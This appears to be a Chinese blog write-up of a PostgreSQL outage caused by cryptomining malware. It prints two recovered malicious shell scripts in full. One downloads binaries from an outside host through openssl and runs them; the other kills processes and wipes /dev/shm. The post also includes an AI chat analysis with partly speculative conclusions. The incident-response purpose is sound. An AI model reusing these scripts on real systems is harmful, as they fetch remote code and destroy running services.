---
title: "背景"
date: 2026-03-01
description: "● 问题描述："
categories: ["PostgreSQL 案例"]
tags: ["VACUUM", "WAL", "内存管理", "参数配置", "备份恢复", "安装部署", "流复制", "监控", "逻辑复制"]
series: []
---

# 背景

● 问题描述：
平台界面登录时报错，登录后台检查VM服务异常无法启动
开发反馈业务层日志无法正常访问 PG , 报错如下

![image-20260301212214982](https://gitee.com/yueludanfeng/images_hub/raw/master/PicGO-updata-img/20260301212215509.png)

# 分析
## 初步分析

根据报错信息, 根据之前的经验, 第一想法是 /etc/systemd/logind.conf 中的 RemoveIPC 配置值怀疑有问题
检查环境中该配置项值是正常的 

```bash
[root@bogon ~]# grep -in remove /etc/systemd/logind.conf 
46:#RemoveIPC=no

[root@bogon ~]# systemctl show systemd-logind | grep RemoveIPC
RemoveIPC=no
```

排除该配置的影响
## 尝试复现问题

发现 执行 psql -Upostgres 无法正常访问, 可以复现问题

初步分析 是中了木马病毒了

```bash
[root@bogon ~]# ps -ef | grep postgres -c 
44
[root@bogon ~]# psql -Upostgres
psql: error: connection to server on socket "/tmp/.s.PGSQL.5432" failed: FATAL:  could not open shared memory segment "/PostgreSQL.1560685450": No such file or directory
[root@bogon ~]# ps -ef | grep postgres 
root     1205382 1154346  0 03:24 pts/4    00:00:00 grep --color=auto postgres
postgres 1836091       1  0 Feb20 ?        00:01:41 og5eKJ
postgres 2422424 1836091  0 Feb20 ?        00:00:00 sh -c /tmp/.mount_XYlnhP
postgres 2423177 2422424  0 Feb20 ?        00:00:00 openssl s_client -quiet -ign_eof -ignore_unexpected_eof -verify_quiet -connect api.ghcr.pkgforge.dev:443
postgres 2423178 2422424  0 Feb20 ?        00:00:00 sed 1,/^\r\{0,1\}$/d
postgres 2493316       1 83 Feb19 ?        6-12:11:13 XkkQuk
postgres 2996503 3133003  0 Feb17 ?        00:00:00 postgres: postgres imos [内网IP](49896) idle
postgres 3133003       1  0 Feb16 ?        01:09:14 /usr/local/pgsql/bin/postgres -D /data/pgdata
postgres 3133004 3133003  0 Feb16 ?        00:33:25 postgres: logger 
postgres 3133005 3133003  0 Feb16 ?        00:00:30 postgres: checkpointer 
postgres 3133006 3133003  0 Feb16 ?        00:00:10 postgres: background writer 
postgres 3133198 3133003  0 Feb16 ?        00:01:46 postgres: walwriter 
postgres 3133199 3133003  0 Feb16 ?        00:01:07 postgres: autovacuum launcher 
postgres 3133200 3133003  0 Feb16 ?        00:00:00 postgres: logical replication launcher 
postgres 3133243 3133003  0 Feb16 ?        00:06:09 postgres: postgres imos [内网IP](44926) idle
postgres 3133253 3133003  0 Feb16 ?        00:00:21 postgres: postgres xx [内网IP](44966) idle
postgres 3133254 3133003  0 Feb16 ?        00:00:12 postgres: postgres xx [内网IP](44976) idle
postgres 3133255 3133003  0 Feb16 ?        00:00:22 postgres: postgres xx [内网IP](44984) idle
postgres 3133286 3133003  0 Feb16 ?        00:00:00 postgres: postgres xx [内网IP](44988) idle
postgres 3133287 3133003  0 Feb16 ?        00:00:00 postgres: postgres xx [内网IP](44996) idle
postgres 3133288 3133003  0 Feb16 ?        00:00:00 postgres: postgres xx [内网IP](45000) idle
postgres 3133289 3133003  0 Feb16 ?        00:00:00 postgres: postgres xx [内网IP](45008) idle
postgres 3133290 3133003  0 Feb16 ?        00:00:00 postgres: postgres xx [内网IP](45018) idle
postgres 3133291 3133003  0 Feb16 ?        00:00:22 postgres: postgres xx [内网IP](45032) idle
postgres 3133293 3133003  0 Feb16 ?        00:00:26 postgres: postgres imos [内网IP](45048) idle
postgres 3133294 3133003  0 Feb16 ?        00:00:12 postgres: postgres xx [内网IP](45050) idle
postgres 3133296 3133003  0 Feb16 ?        00:00:24 postgres: postgres xx [内网IP](45070) idle
postgres 3133297 3133003  0 Feb16 ?        00:00:12 postgres: postgres xx [内网IP](45086) idle
postgres 3133298 3133003  0 Feb16 ?        00:00:21 postgres: postgres xx [内网IP](45098) idle
postgres 3133299 3133003  0 Feb16 ?        00:00:20 postgres: postgres xx [内网IP](45102) idle
postgres 3550538 4125213  0 Feb16 ?        00:00:00 sh -c /dev/shm/PostgreSQL.6muoW6SC
postgres 3550810 3550538  0 Feb16 ?        00:00:00 openssl s_client -quiet -ign_eof -ignore_unexpected_eof -verify_quiet -connect api.ghcr.pkgforge.dev:443
postgres 3550811 3550538  0 Feb16 ?        00:00:00 sed 1,/^\r\{0,1\}$/d
postgres 4125213       1  0 Feb14 ?        00:03:03 QZJIHvoY
[root@bogon ~]# 
```

 存在一些可疑进程(文件), 将打印丢给 AI 分析, AI 反馈疑似病毒
## 恢复方法

* 手动将可以文件对应的进程给 kill -9

* 重启服务(server.sh restart)

  这些是木马程序伪装的进程:

  ```bash
  postgres 1836091       1  0 Feb20 ?        00:01:41 og5eKJ
  postgres 2422424 1836091  0 Feb20 ?        00:00:00 sh -c /tmp/.mount_XYlnhP
  postgres 2423177 2422424  0 Feb20 ?        00:00:00 openssl s_client -quiet -ign_eof -ignore_unexpected_eof -verify_quiet -connect api.ghcr.pkgforge.dev:443
  postgres 2423178 2422424  0 Feb20 ?        00:00:00 sed 1,/^\r\{0,1\}$/d
  postgres 2493316       1 83 Feb19 ?        6-12:11:14 XkkQuk
  postgres 3550538 4125213  0 Feb16 ?        00:00:00 sh -c /dev/shm/PostgreSQL.6muoW6SC
  postgres 3550810 3550538  0 Feb16 ?        00:00:00 openssl s_client -quiet -ign_eof -ignore_unexpected_eof -verify_quiet -connect api.ghcr.pkgforge.dev:443
  postgres 3550811 3550538  0 Feb16 ?        00:00:00 sed 1,/^\r\{0,1\}$/d
  postgres 4125213       1  0 Feb14 ?        00:03:03 QZJIHvoY
  ```

  都已 kill -9 杀掉了

* 检查 PG 可以正常登录, 且没有木马可以进程
```bash
 [root@bogon ~]# psql -Upostgres 
  psql (15.6)
  Type "help" for help.

postgres=# select version();
                                   version                                    
------------------------------------------------------------------------------
 PostgreSQL 15.6 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 10.3.1, 64-bit
(1 row)

postgres=# \q
[root@bogon ~]# ps -ef | grep postgres
postgres 1249825       1  0 03:37 ?        00:00:00 /program/bin/postgres -D /var/runtime/database
postgres 1249826 1249825  0 03:37 ?        00:00:00 postgres: logger 
postgres 1249828 1249825  0 03:37 ?        00:00:00 postgres: checkpointer 
postgres 1249829 1249825  0 03:37 ?        00:00:00 postgres: background writer 
postgres 1249831 1249825  0 03:37 ?        00:00:00 postgres: walwriter 
postgres 1249832 1249825  0 03:37 ?        00:00:00 postgres: autovacuum launcher 
postgres 1249833 1249825  0 03:37 ?        00:00:00 postgres: logical replication launcher 
postgres 1250485 1249825  0 03:37 ?        00:00:00 postgres: postgres foundation 127.0.0.1(39762) idle
postgres 1250486 1249825  0 03:37 ?        00:00:00 postgres: postgres cds 127.0.0.1(39770) idle
postgres 1251023 1249825  0 03:37 ?        00:00:00 postgres: postgres cds [内网IP](40016) idle
postgres 1251024 1249825  0 03:37 ?        00:00:00 postgres: postgres cds [内网IP](40032) idle
postgres 1251025 1249825  0 03:37 ?        00:00:00 postgres: postgres cds [内网IP](40036) idle
...
root     1256957 1255290  0 03:38 pts/6    00:00:00 grep --color=auto postgres

```
* 移走可疑文件
将如下几个可疑的文件挪到 /bak 目录下了
最后, 让一线手动将这几个文件下载到 windows电脑上
然后将服务器上 /bak 目录下这些文件给删除掉

## 分析可疑文件
丢给 AI 分析
帮忙分析下下面两个疑似木马文件的作用
```bash
[root@bogon ~]# cat /bak/.mount_XYlnhP
surl() {
    local r="${1#*://}"
    local opts=("-quiet" "-ign_eof")
    IFS=/ read -r host query <<<"${r}"
    openssl s_client --help 2>&1| grep -qFm1 -- -ignore_unexpected_eof && opts+=("-ignore_unexpected_eof")
    openssl s_client --help 2>&1| grep -qFm1 -- -verify_quiet && opts+=("-verify_quiet")
    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host%%:*}\r\n\r\n" \
        | openssl s_client "${opts[@]}" -connect "${host%%:*}:443" \
        | sed '1,/^\r\{0,1\}$/d'
}
export PATH=$PATH:/tmp
cd /tmp
surl "https://api.ghcr.pkgforge.dev/pkgforge/bincache/iproute2/nixpkgs/ss?tag=446.18.0-x86_64-linux&download=ss">ss
surl "https://api.ghcr.pkgforge.dev/pkgforge/bincache/busybox/official/netstat?tag=HEAD-b99a529-251013T215647-x86_64-linux&download=netstat ">netstat
surl "https://api.ghcr.pkgforge.dev/pkgforge/bincache/busybox/official/pkill?tag=HEAD-b99a529-251013T215647-x86_64-linux&download=pkill" >pkill
surl "https://api.ghcr.pkgforge.dev/pkgforge/bincache/busybox/official/fuser?tag=HEAD-b99a529-251013T215647-x86_64-linux&download=fuser" >fuser
surl "https://api.ghcr.pkgforge.dev/pkgforge/bincache/busybox/official/ps?tag=HEAD-b99a529-251013T215647-x86_64-linux&download=ps" >ps
chmod +x ss netstat pkill fuser ps
pkill -9 -f pg_dump
kill -9 $(cat /tmp/.ICE-unix/m)
cat /tmp/.ICE-unix/m|xargs kill -9
ss -antp|grep -E "72.143|66.85|90.99|253.70|165.82|46.35" |awk -F, {'print $(NF-1)'}|sed 's/pid=//g' |xargs kill -9
netstat -antp|grep -E "72.143|66.85|90.99|253.70|165.82|46.35" |awk {'print $NF'} |cut -d/ -f1|xargs kill -9
fuser -k /tmp/.ICE-unix/m
fuser -k /tmp/.ICE-unix/s
fuser -k /dev/shm/PostgreSQL.127027041
fuser -k /dev/shm/PostgreSQL.127027043
ps |grep pg_dump |xargs kill -9
rm -f ss netstat pkill fuser ps  

[root@bogon ~]#  cat  /bak/.mount_twkSjh 
ps aux | awk '{for(i=11; i<=NF; i++) if(length($i) == 6 && $i ~ /^[a-zA-Z0-9]+$/) print $i}' |grep '[A-Z]' | xargs -r -n 1 pgrep | xargs -r kill -9
ps aux | awk '{for(i=11; i<=NF; i++) if(length($i) == 6 && $i ~ /^[a-zA-Z0-9]+$/) print $i}' |grep '[0-9]' | xargs -r -n 1 pgrep | xargs -r kill -9
ps aux | awk '{for(i=11; i<=NF; i++) if(length($i) == 7 && $i ~ /^[a-zA-Z0-9]+$/) print $i}' |grep '[A-Z]' | xargs -r -n 1 pgrep | xargs -r kill -9
ps aux | awk '{for(i=11; i<=NF; i++) if(length($i) == 7 && $i ~ /^[a-zA-Z0-9]+$/) print $i}' |grep '[0-9]' | xargs -r -n 1 pgrep | xargs -r kill -9
rm -rf /dev/shm/.* /dev/shm/*
```

可以看到    /bak/.mount_twkSjh  末为存在 rm -rf /dev/shm/.* /dev/shm/* 
会删除 /dev/shm 下 PG 资源文件, 从而导致 PG 实例无法正常访问.
## AI 反馈就是 木马程序

````mark
用户让我分析两个疑似木马文件。让我仔细分析这两个脚本的功能：

## 文件1: /bak/.mount_XYlnhP

这个脚本的主要功能：

1. **定义 surl 函数** - 通过HTTPS下载文件
   - 使用 openssl s_client 建立SSL连接
   - 从指定URL下载文件到/tmp目录

2. **下载并替换系统命令**
   - 下载 `ss`, `netstat`, `pkill`, `fuser`, `ps` 这些工具
   - 从 `api.ghcr.pkgforge.dev` 下载
   - 设置可执行权限

3. **杀死特定进程**
   - 杀死 pg_dump 进程
   - 杀死 /tmp/.ICE-unix/m 中列出的进程
   - 杀死连接到特定IP端口的进程（72.143|66.85|90.99|253.70|165.82|46.35）
   - 杀死使用特定文件的进程（/tmp/.ICE-unix/m, /tmp/.ICE-unix/s, /dev/shm/PostgreSQL.127027041, /dev/shm/PostgreSQL.127027043）

4. **清理**
   - 删除下载的文件

## 文件2: /bak/.mount_twkSjh

这个脚本的主要功能：

1. **杀死6个字符的进程名**
   - 查找长度为6的进程名（包含字母或数字）
   - 使用 pgrep 查找并杀死

2. **杀死7个字符的进程名**
   - 查找长度为7的进程名（包含字母或数字）
   - 使用 pgrep 查找并杀死

3. **清理共享内存**
   - 删除 /dev/shm 下的所有文件

## 木马的作用分析

这些脚本明显是**挖矿木马的清理脚本**，作用是：

1. **下载被篡改的系统工具**
   - 下载的 ss, netstat, pkill, fuser, ps 可能是篡改版本
   - 用于隐藏挖矿进程的网络连接
   - 让管理员看不到真实的连接

2. **杀死竞争对手的挖矿进程**
   - 通过特定IP识别（72.143|66.85|90.99|253.70|165.82|46.35）
   - 这些可能是其他挖矿程序的通信IP
   - 杀死使用特定共享内存的PostgreSQL进程

3. **清理痕迹**
   - 删除临时文件
   - 清空共享内存

这种设计显示出挖矿程序竞争激烈，恶意脚本不惜破坏系统完整性来抢占资源。它不仅仅是简单的恶意程序，更是一个精心设计的资源争夺工具，通过替换系统命令、杀死竞争进程等方式实现其目标。
## 木马脚本分析

这两个文件是**挖矿木马的清理和竞争脚本**，让我详细分析：

---

## 文件1: `/bak/.mount_XYlnhP`

### 功能分析

#### 1. **下载恶意工具函数**

```bash
surl() {
    local r="${1#*://}"
    local opts=("-quiet" "-ign_eof")
    IFS=/ read -r host query <<<"${r}"
    openssl s_client --help 2>&1| grep -qFm1 -- -ignore_unexpected_eof && opts+=("-ignore_unexpected_eof")
    openssl s_client --help 2>&1| grep -qFm1 -- -verify_quiet && opts+=("-verify_quiet")
    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host%%:*}\r\n\r\n" \
        | openssl s_client "${opts[@]}" -connect "${host%%:*}:443" \
        | sed '1,/^\r\{0,1\}$/d'
}
```

**作用**：
- 自定义HTTPS下载函数，不依赖curl/wget
- 使用openssl建立加密连接
- 从 `api.ghcr.pkgforge.dev` 下载文件

#### 2. **下载并替换系统工具**

```bash
cd /tmp
surl "https://api.ghcr.pkgforge.dev/pkgforge/bincache/iproute2/nixpkgs/ss?tag=446.18.0-x86_64-linux&download=ss">ss
surl "https://api.ghcr.pkgforge.dev/pkgforge/bincache/busybox/official/netstat?tag=HEAD-b99a529-251013T215647-x86_64-linux&download=netstat ">netstat
surl "https://api.ghcr.pkgforge.dev/pkgforge/bincache/busybox/official/pkill?tag=HEAD-b99a529-251013T215647-x86_64-linux&download=pkill" >pkill
surl "https://api.ghcr.pkgforge.dev/pkgforge/bincache/busybox/official/fuser?tag=HEAD-b99a529-251013T215647-x86_64-linux&download=fuser" >fuser
surl "https://api.ghcr.pkgforge.dev/pkgforge/bincache/busybox/official/ps?tag=HEAD-b99a529-251013T215647-x86_64-linux&download=ps" >ps
chmod +x ss netstat pkill fuser ps
```

**作用**：
- 下载篡改版本的系统工具到 `/tmp/`
- 这些工具可能被修改以：
  - **隐藏挖矿进程的网络连接**
  - **屏蔽特定IP的显示**
  - **隐藏挖矿进程本身**
- 然后将 `/tmp/` 加入PATH，优先使用篡改版本

#### 3. **杀死竞争对手进程**

```bash
pkill -9 -f pg_dump
kill -9 $(cat /tmp/.ICE-unix/m)
cat /tmp/.ICE-unix/m|xargs kill -9
```

**作用**：
- 杀死 `pg_dump` 进程（可能与其他挖马程序冲突）
- 读取并杀死 `/tmp/.ICE-unix/m` 中列出的进程

#### 4. **杀死连接到特定IP的进程**

```bash
ss -antp|grep -E "72.143|66.85|90.99|253.70|165.82|46.35" |awk -F, {'print $(NF-1)'}|sed 's/pid=//g' |xargs kill -9
netstat -antp|grep -E "72.143|66.85|90.99|253.70|165.82|46.35" |awk {'print $NF'} |cut -d/ -f1|xargs kill -9
```

**作用**：
- 监控并杀死连接到这些IP的进程：
  - `72.143.*.*`
  - `66.85.*.*`
  - `90.99.*.*`
  - `253.70.*.*`
  - `165.82.*.*`
  - `46.35.*.*`
- **这些IP很可能是其他挖矿程序的通信服务器**
- 这是为了**清除竞争对手的挖矿进程**

#### 5. **清理资源**

```bash
fuser -k /tmp/.ICE-unix/m
fuser -k /tmp/.ICE-unix/s
fuser -k /dev/shm/PostgreSQL.127027041
fuser -k /dev/shm/PostgreSQL.127027043
```

**作用**：
- 强制杀死使用这些文件的进程
- 清理可能被其他程序占用的资源

```bash
rm -f ss netstat pkill fuser ps
```

**作用**：
- 删除下载的工具，清理痕迹

---

## 文件2: `/bak/.mount_twkSjh`

### 功能分析

```bash
ps aux | awk '{for(i=11; i<=NF; i++) if(length($i) == 6 && $i ~ /^[a-zA-Z0-9]+$/) print $i}' |grep '[A-Z]' | xargs -r -n 1 pgrep | xargs -r kill -9
ps aux | awk '{for(i=11; i<=NF; i++) if(length($i) == 6 && $i ~ /^[a-zA-Z0-9]+$/) print $i}' |grep '[0-9]' | xargs -r -n 1 pgrep | xargs -r kill -9
```

**作用**：
- 查找并杀死所有**长度为6个字符**的进程名
- 包含字母或数字的进程
- 例如：`og5eKJ`, `QZJIHv`（您之前发现的进程！）

```bash
ps aux | awk '{for(i=11; i<=NF; i++) if(length($i) == 7 && $i ~ /^[a-zA-Z0-9]+$/) print $i}' |grep '[A-Z]' | xargs -r -n 1 pgrep | xargs -r kill -9
ps aux | awk '{for(i=11; i<=NF; i++) if(length($i) == 7 && $i ~ /^[a-zA-Z0-9]+$/) print $i}' |grep '[0-9]' | xargs -r -n 1 pgrep | xargs -r kill -9
```

**作用**：
- 查找并杀死所有**长度为7个字符**的进程名
- 同样针对其他挖马程序

```bash
rm -rf /dev/shm/.* /dev/shm/*
```

**作用**：
- 清空 `/dev/shm` 所有内容
- 清理所有共享内存段
- 这会导致所有使用共享内存的程序崩溃！

---

## 木马的整体作用

### 1. **挖矿程序竞争清理**

这是**挖矿木马的"清理器"**，作用是：
- ✅ **杀死其他挖矿程序**
- ✅ **释放系统资源供自己使用**
- ✅ **确保自己的挖矿程序独占系统**

### 2. **隐藏痕迹**

- 下载篡改版本的系统工具
- 让管理员看不到真实的网络连接
- 隐藏挖矿进程

### 3. **针对特定目标**

根据进程特征：
```bash
# 之前发现的进程
postgres 1836091       1  0 Feb20 ?        00:01:41 og5eKJ        # 6个字符
postgres 2493316       1 83 Feb19 ?        6-12:11:11 XkkQuk     # 6个字符
postgres 4125213       1  0 Feb14 ?        00:03:03 QZJIHvoY    # 7个字符
```

这些进程**正是这个脚本的清理目标**！

---

## 木马的生命周期

```
1. 挖矿程序 A 入侵系统
   ├─ 创建 6-7个字符的进程名（og5eKJ, XkkQuk）
   ├─ 占用系统资源进行挖矿
   └─ 使用共享内存

2. 挖矿程序 B 也尝试入侵
   ├─ 执行 .mount_XYlnhP
   ├─ 杀死程序 A 的进程
   ├─ 清空共享内存
   └─ 占用资源

3. 程序 A 可能也会执行 .mount_twkSjh
   ├─ 尝试杀死程序 B
   └─ 互相竞争
```

---

## 立即执行清理

```bash
# 1. 停止所有可疑进程
kill -9 1836091 2493316 4125213 3550538

# 2. 删除木马文件
rm -f /bak/.mount_XYlnhP
rm -f /bak/.mount_twkSjh

# 3. 删除下载的恶意工具
rm -f /tmp/ss /tmp/netstat /tmp/pkill /tmp/fuser /tmp/ps

# 4. 检查其他可疑文件
find /tmp -type f -executable -mtime -7 -exec ls -lh {} \;

# 5. 检查 /dev/shm（不要删除正常的PostgreSQL共享内存！）
ls -la /dev/shm/PostgreSQL.*

# 6. 重启PostgreSQL
su - postgres -c "pg_ctl stop -m fast"
sleep 3
rm -f /var/runtime/database/postmaster.pid
su - postgres -c "pg_ctl start"

# 7. 修改所有密码
passwd
passwd postgres

# 8. 检查启动脚本
grep -E 'mount_XYlnhP|mount_twkSjh|ghcr\.pkgforge\.dev' ~/.bashrc ~/.bash_profile ~/.profile
# 如果发现，删除相关行

# 9. 检查定时任务
crontab -l
su - postgres -c "crontab -l"

# 10. 断开网络（防止进一步入侵）
systemctl stop NetworkManager
```

---

## 深度排查

```bash
# 检查是否还有其他木马文件
find / -name ".mount_*" 2>/dev/null
find /tmp -name "*mount*" 2>/dev/null
find /dev/shm -name "*" -type f -executable 2>/dev/null

# 检查网络连接
ss -antp | grep -E "72\.143|66\.85|90\.99|253\.70|165\.82|46\.35"

# 检查可疑的 systemd 服务
systemctl list-units --all | grep -E 'og5eKJ|XkkQuk|QZJIHvoY'
ls -la /etc/systemd/system/ | grep -E 'og5eKJ|XkkQuk|QZJIHvoY'

# 检查系统日志
grep -r "ghcr.pkgforge.dev" /var/log/
```

---

## 总结

### 木马类型
**挖矿程序竞争清理器**（Anti-Miner）

### 危险等级
🔴 **极高**

### 攻击方式
1. 下载篡改的系统工具
2. 杀死竞争对手的挖矿程序
3. 清空共享内存
4. 占用系统资源

### 影响
- 系统资源被占用（CPU 83%）
- 网络连接被劫持
- 数据安全受威胁
- 可能导致数据泄露

### 建议
1. ✅ 立即清理所有可疑进程和文件
2. ✅ 修改所有用户密码
3. ✅ 检查数据是否泄露
4. ✅ 考虑重装系统
5. ✅ 加强安全防护

**您的系统已经被深度入侵，请立即采取行动！**
````

按照 AI 建议已排查.
